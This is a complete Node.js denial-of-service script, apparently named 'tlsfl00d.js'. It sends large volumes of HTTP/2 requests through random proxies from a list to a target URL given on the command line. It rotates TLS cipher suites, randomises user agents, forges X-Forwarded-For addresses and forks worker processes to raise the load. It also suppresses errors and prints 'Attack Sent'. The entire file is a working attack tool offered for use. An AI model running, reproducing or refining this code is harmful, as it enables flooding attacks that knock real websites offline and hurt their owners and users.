// made sxppy.xyz
require('events').EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);

const fs = require('fs');
const url = require('url');
const http = require('http');
const crypto = require('crypto');
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');
var random_useragent = require('random-useragent');

var proxies = fs.readFileSync(`proxies.txt`, 'utf-8').toString().replace(/\r/g, '').split('\n');

let payload = {};


// node tlsfl00d.js <target> <time> <threads>

try {
  var objetive = process.argv[2];
  var parsed = url.parse(objetive);
} catch (error) {
  console.log('fail to load target data.');
  process.exit();
};

const cplist = [
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];

function randomByte() {
  return Math.round(Math.random() * 256);
}

function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

  return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

class TlsBuilder {

  constructor(socket) {
    this.curve = "GREASE:X25519:x25519"; // Default
    //this.sigalgs = SignalsList;
    //  this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
  };

  Alert() {
    console.log('Attack Sent');
  };

  http2TUNNEL(socket) {

    socket.setKeepAlive(true, 1000);
    socket.setTimeout(15000);

    payload[":method"] = "GET";
    payload["User-agent"] = random_useragent.getRandom();
    payload["Cache-Control"] = 'max-age=0';
    payload['Upgrade-Insecure-Requests'] = 1;
    payload["X-Forwarded-For"] = randomIp();
    payload["Origin"] = objetive;
    payload[":path"] = parsed.path;

    tls.authorized = true;
    tls.sync = true;

    const tunnel = http2.connect(parsed.href, {
      createConnection: () => tls.connect({
        host: parsed.host,
        ciphers: cplist[Math.floor(Math.random() * cplist.length)],
        secureProtocol: 'TLS_method',
        TLS_MAX_VERSION: '1.3',
        port: 80,
        servername: parsed.host,
        maxRedirects: 20,
        followAllRedirects: true,
        curve: "GREASE:X25519:x25519",
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
        sessionTimeout: 5000,
        socket: socket
      }, () => {

        for (let i = 0; i < 24; i++) {

          setInterval(async () => {
            await tunnel.request(payload).close();
          });
        }
      })
    });
  }
}

BuildTLS = new TlsBuilder();
BuildTLS.Alert();

const keepAliveAgent = new http.Agent({
  keepAlive: true, // Keep sockets around even when there are no outstanding requests, so they can be used for future requests without having to reestablish a TCP connection. Defaults to false
  keepAliveMsecs: 50000, // When using the keepAlive option, specifies the initial delay for TCP Keep-Alive packets. Ignored when the keepAlive option is false or undefined. Defaults to 1000.
  maxSockets: Infinity,
  maxTotalSockets: Infinity,
  maxSockets: Infinity // Maximum number of sockets to leave open in a free state. Only relevant if keepAlive is set to true. Defaults to 256.
});

function Runner() {

  for (let i = 0; i < 48; i++) {

    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    var req = http.request({
      host: proxy[0],
      agent: keepAliveAgent,
      globalAgent: keepAliveAgent,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.end();

    req.on('connect', (_, socket) => {
      BuildTLS.http2TUNNEL(socket);
    });

    req.on('end', () => {
      req.resume()
      req.close();
    });
  }
}

setInterval(Runner);

if (cluster.isMaster) {

  for (let i = 0; i < process.argv[4]; i++) {
    cluster.fork();
  };

};

setTimeout(function() {
  process.exit();
}, process.argv[3] * 1000);

process.on('uncaughtException', function(er) {
  //console.log(er)
});
process.on('unhandledRejection', function(er) {
  //console.log(er)
});